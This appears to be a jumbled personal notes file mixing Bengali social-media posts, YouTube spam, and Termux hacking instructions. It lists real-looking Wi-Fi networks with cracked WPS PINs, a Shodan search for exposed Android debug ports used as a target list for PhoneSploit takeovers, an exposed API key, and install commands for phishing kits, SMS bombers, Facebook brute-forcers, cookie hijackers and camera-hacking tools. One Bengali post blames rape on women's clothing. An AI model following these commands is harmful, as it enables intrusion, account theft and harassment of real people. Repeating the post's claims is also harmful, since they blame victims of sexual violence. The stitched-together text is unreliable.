+বোরহান খারাপ ছিলনা,,বোরহান আমাদের মুসলিম দের অহংকার ছিল,,যে কাশমির কে রক্ষা করত।
+
+তাই কেউ না জেনে আজে বাজে কমেন্ট করবেন না।. 6 replies. 64 likes. 
+
+
+ESSID :  DOTTO MEDICAL HOLL
+BSSID :  70:4f:57:55:8a:00
+Channel :  11
+[WPA2-PSK-CCMP][WPS][ESS]
+
+WPS PIN :  56058888
+
+>56058888
+
+git clone https://github.com/Mr-NemrMedo/fb-group-hack
+
+Published on Jun 7, 2017
+
+https://github.com/linkp2p/WPS-PIN
+192.168.0.1
+
+
+https://github.com/brannondorsey/wifi-cracking
+https://github.com/kcdtv/nmk
+
+100027788477328
+
+
+https://github.com/Tutorial-Termux-Hacking/TheXTools
+
+Friends you can you see CCTV camera from your Android device for PC but I suggest you to not use this trick in any illegal method if you try so it will call sun Chemical activities and will be in danger and one thing on this is made only for knowledge purpose if you do some illegal activity then I will be not responsible for this and I hope you like the if you like that then please share and subscribe our Channel if you do so then I will post some other hacking trick if you are interested in search of this 18 things please mention it in comments so I can know that the videos of hacking tricks are you want to watch so I will make another some hacking videos like Google hacking website hacking email hacking wifi hacking in future......
+
+Subscribe our YouTube Channel
+https://www.youtube.com/channel/UCCWc...
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+                   :-)★  ★(-:
+★★★★★WATCHES★★★★★
+******Under ₹100 amazon*****
+http://yamechanic.com/ESJj
+********************************
+    ‡‡★ Unique Gift Under ★‡‡
+  ●●●◆ ₹200 on Amazon ◆●●●
+http://yamechanic.com/ESos
+--------------------------------------------------------------------
+PayTm ₹100 promo code :-) http://yamechanic.com/ETDq
+10 mb GTA krish :-) http://yamechanic.com/ETLM
+Whatsapp message not send ;:-) http://yamechanic.com/ETRH
+Delete Forgotten pattern on your android :-) http://yamechanic.com/ETbR
+GTA SA Real apk+data download :-) https://youtu.be/pxfBfQ38dh8
+GTA India :-) https://youtu.be/gbag8_8QhWs
+GTA IV :-) https://youtu.be/Oj6e0dVeuCM
+
+      •••••  GTA COMPRESSED VERSION••••••
+GTA SA in 433 mb :-) http://yamechanic.com/EUSv
+GTA SA in 263 mb only data:-) http://yamechanic.com/EUK9
+GTA SA in 15 mb :-) http://yamechanic.com/EUOQ
+GTA SA in 5 mb :-) http://yamechanic.com/EUa0
+GTA SA in 3 mb :-) http://yamechanic.com/EUeH
+GTA SA in 3 mb GAMEPLAY :-)) http://yamechanic.com/EUjz
+************(BALANCE TRANSFER)************
+jio to IDEA :-)https://youtu.be/1SPGbslpWuU
+Jio to AIRTEL:-)https://youtu.be/b6EoIEDa8y4
+jio to VODAFONE:-)
+https://youtu.be/MI2ylY4Srd0
+jio to DOCOMO AND AIRCEL :-) https://youtu.be/dI4R2U8b5Do
+Vodafone to Other:-)
+https://youtu.be/LoUbd7SSXIE
+
+-----DATA TRANSFER------
+Jio to AIRTEL:-) https://youtu.be/2b_ekEVZS9A
+
+[51 mb] Dragon ball Z Dokkan battle Download High graphics With Gameplay:-) https://youtu.be/2oWx8PpsdgY
+
+[NO ROOT]How to hack Asphalt nitro by using lucky patcher 100% working:-) https://youtu.be/Bslned9jr0s
+
+[HD] Golmaal Again Full movie Download.#1:-) https://youtu.be/Gd3Qba4TKjc
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+Music provided by NoCopyrightSounds.
+Video Link: 
+symbolis::: https://youtu.be/__CRWE-L45k
+Spectre::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+DON'T FORGET TO LIKE SHARE AND SUBSCRIBE
+THANKS FOR WATCHING 
+
+Cctv hacK
+￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼
+How To Hack Any CCTV Camera With Your Smartphone Or Computer 
+
+
+In This Tutorial i Will Show You How To Hack Any CCTV Camera With Your Smartphone Or Computer 100% Working Method..!!!
+This Video is Only Educational Purpose..!!!
+
+
+CCTV camera hack using Android
+CCTV camera hack using Android mobile
+Hack cctv camera using Android
+Hack cctv camera using mobile
+Hack cctv camera using mobile phone
+Hack cctv camera using Android
+Hack cctv camera using mobile
+Hack cctv camera using mobile phone
+CCTV camera hack
+CCTV camera hacked
+CCTV camera hack using Android
+CCTV camera hack using Android mobile
+CCTV camera hack
+CCTV camera hacked
+CCTV camera hack using Android
+CCTV camera hack using Android mobile
+Hack cctv camera using Android
+Hack cctv camera using mobile
+Hack cctv camera using mobile phone
+Hack cctv camera using Android
+Hack cctv camera using mobile
+Hack cctv camera using mobile phone
+CCTV camera hack
+CCTV camera hacked
+CCTV camera hack using Android
+CCTV camera hack using Android mobile
+CCTV camera hack
+CCTV camera hacked
+CCTV camera hack using Android
+CCTV camera hack using Android mobile
+how to hack cctv camera with kali linux
+how to hack cctv camera on android
+how to hack cctv camera using cmd
+how to hack cctv camera using iphone
+how to hack cctv camera using android phone
+how to hack cctv camera in hindi
+how to hack cctv camera footage
+how to hack cctv camera using android pdf
+how to hack cctv camera with cmd
+how to hack cctv camera in school
+how to hack cctv camera with kali linux
+how to hack cctv camera on android
+how to hack cctv camera using cmd
+how to hack cctv camera using iphone
+
+
+
+
+
+
+https://www.facebook.com/groups/748253819023472/permalink/748584382323749/?app=fbl
+
+https://github.com/MoMuilWH/TmX-FW
+
+https://github.com/Mebus/cupp
+https://github.com/MazenElzanaty/PPyBass
+ESSID :  Mukul_mh
+BSSID :  b0:4e:26:59:03:6c
+Channel :  11
+[WPA2-PSK-CCMP][WPS][ESS]
+
+WPS PIN :  58335802
+https://www.facebook.com/100038475560282/posts/164271541532030/?app=fbl
+
+ধর্ষণ করার মূল কারণ কোনটি?  
+• মেয়েদের অশ্লীল পোশাক। 
+• পুরুষের নিচু মন মানসিকতা।
+• বাংলাদেশের আইন ব্যবস্থা।
+আসুন এগুলো সম্পর্কে আমরা বিস্তারিত আলোচনা করি........
+[বিদ্রঃ পিতার পরিচয় ছারা জন্ম নেওয়া মানুষ গুলোই (হাহা) দিবে, আর তারা এই পোস্ট টা পড়বেন না]
+★  মেয়েদের অশ্লীল পোশাক: মেয়েদের  দিকে ছেলেরা তাকাবে, তাদের টিচ করবে,  এটাই  এখন স্বাভাবিক। ( যদিও  এটা করা খুবিই অন্যায়😡😡) আচ্ছা যাই হোক একটা দুষ্ট ছেলের পাশ দিয়ে যখন ...কওমি মাদ্রাসার কোনো মেয়ে পর্দা করে হেঁটে যায় তখন এই মেয়েটাকে টিচ করবে তো দূরের কথা তকে দেখে, যদি হাতে সিগারেট থাকে সেটাও লুকিয়ে ফেলে। (এটা বাস্তব)😊😊
+আর একটা হট ড্রেস পরা মেয়ে দেখতেও হট, এই মেয়েটা যদি ভালো কোনো ছেলের পাশদিয়ে যায় ভালো ছেলেটাও তাকে টিছ করতে চাইবে, আর সাথে সাথে মেয়েটাকে চোখ দিয়ে ধর্ষণ করা শুরু করে দিবে (কল্পনায়)। আর এই মেয়েটা যখন খারাপ কোন ছেলের পাশদিয়ে যাবে, তখন ছেলেটার যৌন চাহিদা মেটাতে ইচ্ছে করবে। তখন তার এই চহিদা মেটাতে শিখার হয় (বৃদ্ধ মহিলা, মেয়ে শিশু, বোকরা পড়া মেয়ে)। বেশিরভাগ ধর্ষণের মূল কারণ যৌন চাহিদা (এটা আমারা সবাই  জানি)। যৌন চাহিদা মনের মধ্যে তৈরি হয়, হট ড্রেস পরা মেয়ে, সিনেমার হট সিন এগুলো দেখে। 
+★ তাই এক্ষেত্রে আমরা বলতে পারি, ধর্ষণের মূল কারণ, পুরুষের মন মানসিকতা। আর এই মন মানসিকতা তৈরি হয়  মেয়েদের পোশাক এর জন্য।😊😊
+★ বাংলাদেশের আইন: 
+১। হস্তমৈথুন বা বিয়ে;(আপনি সমাজে কোন আপরাধী না) 
+২। ধর্ষণ। (আপনার ফাঁসি হবে)
+
+এ দুটুই যৌন চাহিদা মিটায়।
+
+যখন আপনি হট ড্রেসের মেয়ে দেখে যৌন চাহিদা মেটাতে চাইবেন উপরের কোনটা নিবেন? ১ না ২?? 
+আবশ্যই ১!! 
+মৃত্যুর ভয় সবারএই আছে কেউ চাইবে না একটা ধর্ষণ করে ফাঁসিতে ঝুলতে। 😊😊
+কোথাও ভুল হলে ক্ষমার চোখে দেখবেন।
+
+
+
+
+
+
+https://github.com/Tutorial-Termux-Hacking/TheXTools
+
+
+
+
+
+how to make wordlist in windows
+how to make wordlist in parrot os
+how to make wordlist with crunch
+how to make wordlist using crunch
+how to make wordlist
+how to make wordlist in kali linux
+how to make wordlist in termux
+wordlist for kali linux
+wordlist generator termux
+wordlist for brute force
+wordlist generator
+wordlist generator kali
+wordlist for openbullet
+wordlist for aircrack-ng windows
+wordlist generator windows 10
+wordlist password download
+wordlist crunch
+
+
+
+https://free.facebook.com/profile.php?v=info&lst=100027788477328%3A100023667459198%3A1579489505&id=100023667459198&refid=17&ref=dbl
+
+https://free.facebook.com/profile.php?v=timeline&lst=100027788477328%3A100023667459198%3A1579489505&id=100023667459198&refid=17&ref=dbl
+
+https://free.facebook.com/profile.php?v=timeline&lst=100038475560282%3A100023667459198%3A1579489992&id=100023667459198&refid=17&ref=dbl
+
+apt update
+apt upgrade
+apt install git
+apt install python
+git clone https://github.com/bhavsec/reconspider
+cd reconspider
+python setup.py install
+ls
+python reconspider.py 
+
+
+
+
+BzG6pXvl4EOW8R6ikmqIZRzdpKu4oAit
+
+Make an account
+Go to 
+https://shodan.io
+More options
+Go back to the main page
+Log in to your new account
+In the top right corner, there will be gray text that says "Show API key" click it.
+It will display something like this: API key: 378ndug4j6hjbdgb5678dmg
+Copy the random string, this is your API key.
+Open termux
+Do these commands
+$pkg update && pkg upgrade && pkg install unstable-repo x11-repo git python shodan nano
+$mkdir shodan
+$cd shodan
+$touch shodan-api.txt. <--- "touch" is a command that creates a file in your current directory, it doesn't mean touch the screen with your finger.
+$echo "Shodan API key: <BzG6pXvl4EOW8R6ikmqIZRzdpKu4oAit>" > shodan-api.txt. <----- do not include < or > when you paste the API key, those are just to show that user supplied input is needed.
+Your shodan API key is now safe in this txt file for future use.
+$ shodan init <BzG6pXvl4EOW8R6ikmqIZRzdpKu4oAit>
+ <---- do not include < or > when you paste the API key, those are just to show that user supplied input is needed
+
+$shodan search "Android Debug Bridge" "Device" port:5555 > adb-devices-5555.txt <------ this creates a txt file called adb-devices-5555.txt that will hold your list of vulnerable targets.
+$nano adb-devices-5555.txt
+
+
+
+
+Install Termux ADB
+1. apt update && apt install wget
+wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh && bash InstallTools.sh
+Install Shodan Eye
+1. git clone https://github.com/BullsEye0/shodan-eye.git
+2. cd shodan-eye
+3. pip install -r requirements.txt
+4. python2 shodan_eye.py
+5. https://account.shodan.io/login?continue=h
+ttps%3A%2F%2Faccount.shodan.io%2F
+6. Android Debug Bridge
+7. Y/N (NO CLIP)
+1. NEW SEASON TERMUX OPEN
+
+https://drive.google.com/file/d/1E2g52GDZZAg3_xCgVbKNDU6GOBBVfJzI/view?usp=drivesdk
+
+Install Termux ADB 1st Command:-
+
+apt update && apt install wget
+wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh && bash InstallTools.sh
+
+2nd Command:1-160-144-191.dynamic-ip.hinet.net
+1.160.144.191
+
+git clone https://github.com/metachar/PhoneSploit
+cd PhoneSploit
+
+
+pip install colorama
+
+https://www.shodan.io/search?query=android+debug+bridge+product%3A”Android+Debug+Bridge”
+
+python2 main_linux.py (Type =Y )
+shodan Eye ID ကိုယူထည့္ပါ(Eg=ipက188.68.158.7
+7)
+As u like upline Number choice
+မွတ္ခ်က္ save မယ္ဆို ေနရာျပေပးကမယ္
+Eg /storage/emulated/0
+No6 Android Debug Bridgeေနရာမာ hlteuc သံုးလဲရပါတယ္
+Admin #h3inht3t .za2.213
+
+
+https://github.com/MaulanaRyM/SpaMsmS
+
+
+pkg update && pkg upgrade
+pkg install git
+pkg install php
+pkg install python
+pkg install python2
+pkg install wget
+pkg install bash
+pkg install openssh
+git clone https://github.com/Cesar-Hack-Gray/FotoSploit
+cd FotoSploit
+chmod +x install.sh
+bash install.sh
+bash FotoSploit.sh
+
+git clonehttps://github.com/KANG-NEWBIE/SpamSms
+
+
+https://github.com/TheSpeedX/TBomb
+
+apt update && apt install git php curl openssh -y && git clone https://github.com/htr-tech/zphisher && cd zphisher && chmod +x zphisher.sh && bash zphisher.sh
+
+
+* আমরা সেই দেশের নাগরিক, যে দেশে মেয়েরা ধর্ষণে শিখার হয়ে কোনো বিচার পায় না। 
+* আমরা সেই দেশে প্রতিদিন সকালে লাল সবুজের পতাকা উড়াই, যেদেশে মেয়েরা  সবুজ ঘাসের উপর ৩ঘন্টা ধরে ধর্ষণ হয়ে লাল রক্তমাখা দেহ নিয়ে পরে থেকে আরো একটা লাল সবুজের পতাকা তৈরি করে।  আর ফাঁসানো হলো, #মজনুর মতো মানসিক ভার্সাম্যহীন একটা পাগল কে।  সাবাস 4G বাংলাদেশ।👏👏👏👏👏👏👏👏👏👏👏👏👏👏👏👏👏👏👏👏
+
+
+
+..  ⏩
+pkg update && pkg upgrade 
+pkg install python2
+pkg install git
+pkg install openssh
+git clone https://github.com/thelinuxchoice/sayhello
+ls
+cd sayhello
+ls
+chmod x+ *
+ls
+bash sayhello.sh
+
+🖕Run This Tool Again
+
+👉ls
+👉cd sayhello
+👉ls
+👉bash sayhello.sh
+
+And Prass Enter
+
+
+https://youtu.be/gcV87TSOd74
+
+
+
+Commands:
+apt-get install git && git clone https://github.com/AngelSecurityTeam/Cam-Hackers && pip3 install requests && cd Cam-Hackers && python3 cam-hackers.py
+
+apt-get install python && apt-get install git && git clone https://github.com/AngelSecurityTeam/Cam-Hackers && pip3 install requests && cd Cam-Hackers && python cam-hackers.py
+
+
+
+https://github.com/firecracker-microvm/firecracker
+
+
+https://github.com/Ranginang67/Firecrack
+
+
+ https://www.facebook.com/100045674113253/posts/105939657605171/?substory_index=2&app=fbl
+
+cloning facebook account, facebook cloning app, facebook cloning new trick, facebook cloning 2019, facebook cloning trick, unlimited facebook account, unlimited facebook account create bangla 2019, unlimited facebook account without phone number
+
+
+মজনু কোনো দর্শক না। এটা একটা ষড়যন্ত্র। 
+
+১|  71 TV এর ক্যামেরায় ধরা পরে 
+
+
+
+
+
+
+
+
+
+https://free.facebook.com/groups/274649316773743?refid=27&ref=dbl
+
+https://free.facebook.com/profile.php?id=100045674113253
+
+hiddeneye in termux, hiddeneye termux no root, hidden eye download, hiddeneye commands, hidden eye not working, hiddeneye install termux, hidden eye tutorial, hidden eye tool
+
+
+pkg install git php curl openssh grep && git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye && chmod 777 HiddenEye && cd HiddenEye && python HiddenEye.py
+
+https://drive.google.com/file/d/1-BThrkd_hav86UTfR9KWgYGos3FHDqxb/view?usp=drivesdk
+
+http://www.mediafire.com/file/fflv8ypiumrwidq/command.txt/file 
+
+Hlw, Sir i am a real Facebook user Now I need a blue verification badge. Sob I will sent you My National NID card Picture please Review IT and veryfied my Facebook account with Blue badge.
+
+
+
+https://github.com/donbr0wn/Facebook-cookies-hijacking-
+
+
+apt update && apt upgrade
+pkg install python2
+pip2 install mechanize
+pip2 install requests
+pkg install zip
+pkg install SETAN
+pkg install git
+git clone https://github.com/FR13ND8/BRUTEFORCEnew
+ls
+cd BRUTEFORCEnew
+sh new.sh
+
+
+
+125
+1672
+
+
+Published on Jun 14, 2019
+
+How to report facebook account 2019 || 1 report remove any fb account by termux || by trick master
+So Watch Full video (Never Skip Video)
+●⚀◇-------------------------------------◇⚀● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+●⚀◇---------report command--◇⚀●
+
+dpkg --configure -a
+apt update && apt upgrade -y 
+pkg install git -y 
+pkg install python2 -y 
+git clone https://github.com/Cabdulahi/fbr 
+cd fbr
+sh install.sh
+chmod +x fbr.py
+python2 fbr.py
+
+
+AbmPur BD, abmpur, Abm Pur, Abm Pur BD, Abm Pur bd, Abm Mujahid, Abm, TechPur BD, Tech Pur BD, CyberTube BD, CCE8, Abm BD, AbmBD, account by termux || by trick master
+So Watch Full video (Never Skip Video)
+●⚀◇-------------------------------------◇⚀● ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬ ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+●⚀◇---------report command--◇⚀●
+
+dpkg --configure -
